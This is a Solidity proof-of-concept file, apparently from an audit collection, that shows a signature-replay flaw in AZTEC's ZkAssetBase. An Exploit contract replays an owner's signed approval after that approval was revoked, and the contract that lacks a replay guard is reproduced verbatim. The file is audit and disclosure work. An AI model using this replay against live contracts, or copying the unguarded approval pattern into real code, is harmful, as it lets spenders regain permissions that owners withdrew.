// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity >=0.5.0 <0.6.0;

// =============================================================================
// AuditVault #16739 — AZTEC `confidentialApprove` signature replay / revocation
// inversion.  This file deploys the REAL, UNMODIFIED audited `ZkAssetBase`
// snapshot (the version immediately before fix commit e730bde0, which had no
// `signatureLog` replay guard) together with its real EIP-712 / signature
// dependencies, and runs the real replay exploit with genuine ECDSA signatures.
//
// The only non-audited piece is the ACE note-registry shim: a real AZTEC note
// can only be created by a validated zero-knowledge mint/join-split proof, which
// requires the off-chain aztec.js proving toolchain.  The note's existence and
// ownership is therefore a *precondition external to this bug* — the replay
// vulnerability lives entirely inside `ZkAssetBase.confidentialApprove` /
// `validateSignature`, which are the real audited code below.
// =============================================================================

// ----------------------------- SafeMath (OZ) --------------------------------
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

// ----------------------------- NoteUtils (AZTEC) ----------------------------
library NoteUtils {
    function getLength(bytes memory _proofOutputsOrNotes) internal pure returns (uint len) {
        assembly { len := mload(add(_proofOutputsOrNotes, 0x20)) }
    }
    function get(bytes memory _proofOutputsOrNotes, uint _i) internal pure returns (bytes memory out) {
        bool valid;
        assembly {
            valid := lt(_i, mload(add(_proofOutputsOrNotes, 0x20)))
            out := add(mload(add(add(_proofOutputsOrNotes, 0x40), mul(_i, 0x20))), _proofOutputsOrNotes)
        }
        require(valid, "AZTEC array index is out of bounds");
    }
    function extractProofOutput(bytes memory _proofOutput) internal pure returns (
        bytes memory inputNotes, bytes memory outputNotes, address publicOwner, int256 publicValue
    ) {
        assembly {
            inputNotes := add(_proofOutput, mload(add(_proofOutput, 0x20)))
            outputNotes := add(_proofOutput, mload(add(_proofOutput, 0x40)))
            publicOwner := and(mload(add(_proofOutput, 0x60)), 0xffffffffffffffffffffffffffffffffffffffff)
            publicValue := mload(add(_proofOutput, 0x80))
        }
    }
    function extractNote(bytes memory _note) internal pure returns (
        address owner, bytes32 noteHash, bytes memory metadata
    ) {
        assembly {
            owner := and(mload(add(_note, 0x40)), 0xffffffffffffffffffffffffffffffffffffffff)
            noteHash := mload(add(_note, 0x60))
            metadata := add(_note, 0x80)
        }
    }
    function getNoteType(bytes memory _note) internal pure returns (uint256 noteType) {
        assembly { noteType := mload(add(_note, 0x20)) }
    }
}

// ----------------------------- ProofUtils (AZTEC) ---------------------------
library ProofUtils {
    function getProofComponents(uint24 proof) internal pure returns (uint8 epoch, uint8 category, uint8 id) {
        assembly {
            id := and(proof, 0xff)
            category := and(div(proof, 0x100), 0xff)
            epoch := and(div(proof, 0x10000), 0xff)
        }
        return (epoch, category, id);
    }
}

// ----------------------------- IERC20 (AZTEC) -------------------------------
interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function mint(address _to, uint256 _value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// ----------------------------- IAZTEC (AZTEC) -------------------------------
contract IAZTEC {
    enum ProofCategory { NULL, BALANCED, MINT, BURN, UTILITY }
    enum NoteStatus { DOES_NOT_EXIST, UNSPENT, SPENT }
    uint24 public constant JOIN_SPLIT_PROOF = 65793;
    uint24 public constant MINT_PROOF = 66049;
    uint24 public constant BURN_PROOF = 66305;
}

// ----------------------------- IZkAsset (AZTEC) -----------------------------
contract IZkAsset {
    event CreateZkAsset(address indexed aceAddress, address indexed linkedTokenAddress,
        uint256 scalingFactor, bool indexed _canAdjustSupply, bool _canConvert);
    event CreateNoteRegistry(uint256 noteRegistryId);
    event CreateNote(address indexed owner, bytes32 indexed noteHash, bytes metadata);
    event DestroyNote(address indexed owner, bytes32 indexed noteHash, bytes metadata);
    event ConvertTokens(address indexed owner, uint256 value);
    event RedeemTokens(address indexed owner, uint256 value);
    event UpdateNoteMetaData(address indexed owner, bytes32 indexed noteHash, bytes metadata);
    function confidentialApprove(bytes32 _noteHash, address _spender, bool _status, bytes calldata _signature) external;
    function confidentialTransferFrom(uint24 _proof, bytes calldata _proofOutput) external;
    function confidentialTransfer(bytes memory _proofData, bytes memory _signatures) public;
}

// ----------------------------- LibEIP712 (AZTEC) ----------------------------
contract LibEIP712 {
    string constant internal EIP712_DOMAIN_NAME = "AZTEC_CRYPTOGRAPHY_ENGINE";
    string constant internal EIP712_DOMAIN_VERSION = "1";
    bytes32 constant internal EIP712_DOMAIN_SEPARATOR_SCHEMA_HASH = keccak256(abi.encodePacked(
        "EIP712Domain(", "string name,", "string version,", "address verifyingContract", ")"));
    bytes32 public EIP712_DOMAIN_HASH;

    constructor () public {
        EIP712_DOMAIN_HASH = keccak256(abi.encode(
            EIP712_DOMAIN_SEPARATOR_SCHEMA_HASH,
            keccak256(bytes(EIP712_DOMAIN_NAME)),
            keccak256(bytes(EIP712_DOMAIN_VERSION)),
            address(this)));
    }

    function hashEIP712Message(bytes32 _hashStruct) internal view returns (bytes32 _result) {
        bytes32 eip712DomainHash = EIP712_DOMAIN_HASH;
        assembly {
            let memPtr := mload(0x40)
            mstore(0x00, 0x1901)
            mstore(0x20, eip712DomainHash)
            mstore(0x40, _hashStruct)
            _result := keccak256(0x1e, 0x42)
            mstore(0x40, memPtr)
        }
    }

    function recoverSignature(bytes32 _message, bytes memory _signature) internal view returns (address _signer) {
        bool result;
        assembly {
            let byteLength := mload(_signature)
            mstore(_signature, _message)
            let v := mload(add(_signature, 0x60))
            v := shr(248, v)
            mstore(add(_signature, 0x60), mload(add(_signature, 0x40)))
            mstore(add(_signature, 0x40), mload(add(_signature, 0x20)))
            mstore(add(_signature, 0x20), v)
            result := and(
                and(
                    or(eq(byteLength, 0x41), eq(byteLength, 0x60)),
                    or(eq(v, 27), eq(v, 28))
                ),
                staticcall(gas, 0x01, _signature, 0x80, _signature, 0x20)
            )
            switch eq(_message, mload(_signature))
            case 0 { _signer := mload(_signature) }
            mstore(_signature, byteLength)
        }
        if (!(result && (_signer != address(0x0)))) {
            require(_signer != address(0x0), "signer address cannot be 0");
            require(result, "signature recovery failed");
        }
    }
}

// ----------------------------- MetaDataUtils (AZTEC) ------------------------
contract MetaDataUtils {
    function extractAddress(bytes memory metaData, uint256 addressPos) public returns (address desiredAddress) {
        uint256 numAddresses;
        assembly {
            numAddresses := mload(add(metaData, 0x20))
            desiredAddress := mload(add(add(metaData, add(0xe1, 0x20)), mul(addressPos, 0x20)))
        }
        require(addressPos < numAddresses,
            'addressPos out of bounds - addressPos must be less than the number of addresses to be approved');
    }
}

// ----------------------------- ACE note-registry shim -----------------------
// Precondition-only: reports the confidential note as UNSPENT and owned by the
// configured note owner.  A real note enters ACE only via a validated ZK proof
// (off-chain proving), so this shim stands in for that external precondition.
// It performs NO signature or approval logic — that is all in ZkAssetBase.
contract ACE {
    using NoteUtils for bytes;
    address public configuredOwner;
    function createNoteRegistry(address, uint256, bool, bool) external {}
    function setConfiguredOwner(address owner) external { configuredOwner = owner; }
    function getNote(address, bytes32) external view returns (uint8, uint40, uint40, address) {
        return (1, 0, 0, configuredOwner); // status = UNSPENT(1), owner = configuredOwner
    }
    function validateProof(uint24, address, bytes calldata) external pure returns (bytes memory) {
        return new bytes(0);
    }
    function updateNoteRegistry(uint24, bytes calldata, address) external {}
}

// ----------------------------- ZkAssetBase (REAL AUDITED SOURCE) ------------
// Verbatim from AztecProtocol/aztec-v1 packages/protocol/contracts/ERC1724/base
// /ZkAssetBase.sol at the snapshot immediately before fix commit e730bde0. The
// vulnerable `confidentialApprove` / `validateSignature` are unmodified.
contract ZkAssetBase is IZkAsset, IAZTEC, LibEIP712, MetaDataUtils {
    using NoteUtils for bytes;
    using SafeMath for uint256;
    using ProofUtils for uint24;

    string constant internal EIP712_DOMAIN_NAME = "ZK_ASSET";

    bytes32 constant internal NOTE_SIGNATURE_TYPEHASH = keccak256(abi.encodePacked(
        "NoteSignature(", "bytes32 noteHash,", "address spender,", "bool spenderApproval", ")"));

    bytes32 constant internal JOIN_SPLIT_SIGNATURE_TYPE_HASH = keccak256(abi.encodePacked(
        "JoinSplitSignature(", "uint24 proof,", "bytes32 noteHash,", "uint256 challenge,", "address sender", ")"));

    ACE public ace;
    IERC20 public linkedToken;

    mapping(bytes32 => mapping(address => bool)) public confidentialApproved;
    mapping(bytes32 => uint256) public metaDataTimeLog;
    mapping(bytes32 => uint256) public noteAccess;

    constructor(
        address _aceAddress, address _linkedTokenAddress, uint256 _scalingFactor, bool _canAdjustSupply
    ) public {
        bool canConvert = (_linkedTokenAddress == address(0x0)) ? false : true;
        EIP712_DOMAIN_HASH = keccak256(abi.encodePacked(
            EIP712_DOMAIN_SEPARATOR_SCHEMA_HASH,
            keccak256(bytes(EIP712_DOMAIN_NAME)),
            keccak256(bytes(EIP712_DOMAIN_VERSION)),
            bytes32(uint256(address(this)))));
        ace = ACE(_aceAddress);
        linkedToken = IERC20(_linkedTokenAddress);
        ace.createNoteRegistry(_linkedTokenAddress, _scalingFactor, _canAdjustSupply, canConvert);
        emit CreateZkAsset(_aceAddress, _linkedTokenAddress, _scalingFactor, _canAdjustSupply, canConvert);
    }

    function confidentialApprove(
        bytes32 _noteHash, address _spender, bool _spenderApproval, bytes memory _signature
    ) public {
        ( uint8 status, , , ) = ace.getNote(address(this), _noteHash);
        require(status == 1, "only unspent notes can be approved");
        bytes32 _hashStruct = keccak256(abi.encode(
                NOTE_SIGNATURE_TYPEHASH, _noteHash, _spender, _spenderApproval));

        validateSignature(_hashStruct, _noteHash, _signature);
        confidentialApproved[_noteHash][_spender] = _spenderApproval; // @> VULN: no signatureLog — this signed struct can be replayed after the owner revokes.
    }

    function validateSignature(
        bytes32 _hashStruct, bytes32 _noteHash, bytes memory _signature
    ) internal view {
        (, , , address noteOwner ) = ace.getNote(address(this), _noteHash);
        address signer;
        if (_signature.length != 0) {
            bytes32 msgHash = hashEIP712Message(_hashStruct);
            signer = recoverSignature(msgHash, _signature);
        } else {
            signer = msg.sender;
        }
        require(signer == noteOwner, "the note owner did not sign this message");
    }

    function extractSignature(bytes memory _signatures, uint _i) internal pure returns (bytes memory _signature) {
        bytes32 v; bytes32 r; bytes32 s;
        assembly {
            v := mload(add(add(_signatures, 0x20), mul(_i, 0x60)))
            r := mload(add(add(_signatures, 0x40), mul(_i, 0x60)))
            s := mload(add(add(_signatures, 0x60), mul(_i, 0x60)))
        }
        _signature = abi.encode(v, r, s);
    }

    function confidentialTransfer(uint24, bytes memory, bytes memory) public { revert("not used in PoC"); }
    function confidentialTransfer(bytes memory, bytes memory) public { revert("not used in PoC"); }
    function confidentialTransferFrom(uint24, bytes memory) public { revert("not used in PoC"); }
}

// ----------------------------- Exploit --------------------------------------
contract Exploit {
    ACE public ace;
    ZkAssetBase public asset;

    // Note owner = well-known test key #0 (0xf39F…2266); its signatures below are
    // genuine ECDSA over the real EIP-712 NoteSignature digest for this asset.
    address constant OWNER   = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address constant SPENDER = 0x000000000000000000000000000000000000bEEF;
    bytes32 constant NOTE_HASH = 0x260549c86c722d0493d1e3a0c8e642ee4665ab783003eed2d53b015470ffa1eb;

    bool public approvedAfterGrant;
    bool public approvedAfterRevoke;
    bool public approvedAfterReplay;

    constructor() public {
        ace = new ACE();                                    // CREATE nonce 1
        ace.setConfiguredOwner(OWNER);
        asset = new ZkAssetBase(address(ace), address(0), 1, false); // CREATE nonce 2 -> deterministic addr
    }

    // Owner's signature approving the spender (spenderApproval = true).
    function _sigApprove() internal pure returns (bytes memory) {
        return abi.encodePacked(
            bytes32(0x2d54e37245b3bf3609414e3ae0db0ef6cbbe40c96f95fdcf25a8348a7a633d93),
            bytes32(0x77541298c4da3d363faca5500bdb5536b687fd765f3b15e1823bfa106d4408bc),
            uint8(27));
    }
    // Owner's signature revoking the spender (spenderApproval = false).
    function _sigRevoke() internal pure returns (bytes memory) {
        return abi.encodePacked(
            bytes32(0xf6b90953ce4b48bb4068e6d81539e9aca3c3350c2d746283f00eb566747655b2),
            bytes32(0x23009510829d3f92e617ea8281adfe5c6713af8b9a9a4ebbab481dbcdda1b55e),
            uint8(28));
    }

    function run() external {
        // 1) Owner's signed approval, relayed by anyone -> spender gains permission.
        asset.confidentialApprove(NOTE_HASH, SPENDER, true, _sigApprove());
        approvedAfterGrant = asset.confidentialApproved(NOTE_HASH, SPENDER);

        // 2) Owner's signed revocation -> permission is withdrawn on-chain.
        asset.confidentialApprove(NOTE_HASH, SPENDER, false, _sigRevoke());
        approvedAfterRevoke = asset.confidentialApproved(NOTE_HASH, SPENDER);

        // 3) REPLAY the owner's original approval signature. There is no
        //    signatureLog, so the stale signed struct is accepted again and the
        //    revoked permission is restored WITHOUT the owner's consent.
        asset.confidentialApprove(NOTE_HASH, SPENDER, true, _sigApprove());
        approvedAfterReplay = asset.confidentialApproved(NOTE_HASH, SPENDER);

        require(
            approvedAfterGrant && !approvedAfterRevoke && approvedAfterReplay,
            "replay did not restore the revoked approval"
        );
    }
}
